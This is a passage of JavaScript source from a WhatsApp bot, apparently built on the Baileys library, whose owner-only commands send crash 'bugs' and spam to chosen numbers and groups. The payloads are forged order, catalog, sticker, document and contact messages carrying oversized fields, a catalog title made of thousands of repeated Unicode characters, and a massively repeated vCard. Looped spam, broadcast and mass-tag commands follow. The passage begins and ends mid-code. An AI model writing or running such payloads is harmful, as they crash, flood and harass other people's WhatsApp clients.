var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"groupName": `𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
//════════════════════════════//
case 'troli': {
if (!isCreator) return
if (isBan) throw (from)

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./DataBoss/image/pict.jpg'),
"orderTitle": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"sellerJid": "6281528628870@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
break
//════════════════════════════//
case 'catalog': {
if (!isCreator) return
if (isBan) throw (from)

var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `[⫹⫺ - 㑒 ❝𝗥𝗔𝗘𝗛𝗔𝗡 𝗠𝗢𝗗𝗦 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦`,
"description": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,
"currencyCode": "IDR",
"footerText": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986 𝗪𝗘 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗠𝗔𝗦𝗧𝗢𝗗`,
"url": "wa.me/6281528628870"
},
"businessOwnerJid": "6281528628870@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ReyDong })
BossRaehan.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break

//════════════════════════════//
case 'catalogpc': case 'cataloggc':  {
if (!isCreator) return
if (isBan) throw (from)

if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./DataBoss/image/rey.jpg') }, { upload: BossRaehan.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"description": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,
"currencyCode": "IDR",
"footerText": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986 𝗪𝗘 𝗔𝗥𝗘 𝗠𝗔𝗦𝗧𝗢𝗗`,
"url": "wa.me/6281528628870"
},
"businessOwnerJid": "6281528628870@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ReyDong})
BossRaehan.relayMessage(num, catalog.message, { messageId: catalog.key.id })
}
deploy(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
}
break
//════════════════════════════//
/*BUG WACAP */
case 'ampas1' : {
if (!isCreator) return
if (isBan) throw (from)

Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await BossRaehan.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
}
break
//════════════════════════════//
/*BUG WACAP */
case 'ampas2' : {
if (isBan) throw (from)

if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await BossRaehan.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(20)
BossRaehan.sendMessage(Pe, {text: "Xd"}, {quoted: ReyDong})
await sleep(10000)
}
break
//════════════════════════════//
case 'gashan': {
if (isBan) throw (from)

if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
deploy(`${m.pushName} 𝗥𝗔𝗘𝗛𝗔𝗡 1986${text ? ': ' + text : ''}`)
}
break
//════════════════════════════//
case 'bugstik':{
if (!isCreator) throw (from)
if (isBan) throw (from)
if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku BossRaehan`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, {sticker: thumb},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "999999999999",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//════════════════════════════//
case 'bugie':{
if (!isCreator) return
if (isBan) throw (from)

if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku BossRaehan`
for (let i = 0; i < jumlah; i++) {
BossRaehan.sendMessage(m.chat, {document: thumb},{quoted: {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
}
break
//════════════════════════════//
//════════════════════════════//
case 'bugbctext': {
if (!isCreator) return
if (isBan) throw (from)

if (!text) throw `*Type some text*\n\nExample : ${prefix + command} RAEHAN1986`
let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${BossRaehan.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
let anu = await store.chats.all().map(v => v.id)
anjay(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
for (let yoi of anu) {
await sleep(1500)
BossRaehan.sendMessage(yoi, {text:`${text}`}, {quoted:ReyDong})
}
anjay('*Success Broadcast*')
}
break
//════════════════════════════//

//════════════════════════════//
case 'bugtag': {
if (!isCreator) return
if (isBan) throw (from)

if (!m.isGroup) throw (from)
BossRaehan.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: ReyDong })
}
break

//════════════════════════════//
case 'bugkontakk': {
if (!isCreator) return
if (isBan) throw (from)

 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝗥𝗔𝗘𝗛𝗔𝗡 1986${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝗥𝗔𝗘𝗛𝗔𝗡 1986\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 